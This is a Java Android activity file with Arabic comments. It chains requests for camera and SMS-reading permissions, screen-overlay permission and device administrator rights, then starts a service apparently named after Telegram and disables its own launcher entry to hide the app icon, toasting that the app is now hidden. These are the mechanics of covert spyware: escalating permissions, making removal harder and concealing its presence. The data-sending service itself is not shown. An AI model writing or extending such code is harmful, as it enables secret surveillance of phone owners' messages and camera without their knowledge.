package com.example.app;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQ_PERM = 100;
    private static final int REQ_OVERLAY = 101;
    private static final int REQ_ADMIN = 102;
    
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        // البدء بأذونات الكاميرا والرسائل أولاً
        checkPermissions();
    }

    // 1. فحص وطلب أذونات الكاميرا والرسائل
    private void checkPermissions() {
        String[] perms = {Manifest.permission.CAMERA, Manifest.permission.READ_SMS};
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            for (String p : perms) {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    requestPermissions(perms, REQ_PERM);
                    return;
                }
            }
        }
        checkOverlay();
    }

    // 2. فحص وطلب إذن الظهور فوق التطبيقات
    private void checkOverlay() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, REQ_OVERLAY);
        } else {
            checkAdmin();
        }
    }

    // 3. فحص وطلب إذن مسؤول الجهاز
    private void checkAdmin() {
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            startActivityForResult(intent, REQ_ADMIN);
        } else {
            // تشغيل الخدمة الرئيسية
            startService(new Intent(this, TelegramService.class));
            
            // إخفاء الأيقونة بعد اكتمال كافة الأذونات
            hideAppIcon();
            
            finish();
        }
    }

    // إخفاء الأيقونة
    private void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
        Toast.makeText(this, "تم تفعيل الحماية وإخفاء التطبيق", Toast.LENGTH_SHORT).show();
    }

    // استجابة طلب الأذونات العادية (الكاميرا والرسائل)
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == REQ_PERM) {
            checkOverlay();
        }
    }

    // استجابة الشاشات الأخرى (الظهور فوق التطبيقات + مسؤول الجهاز)
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQ_OVERLAY) {
            checkAdmin();
        } else if (requestCode == REQ_ADMIN) {
            checkAdmin();
        }
    }
}
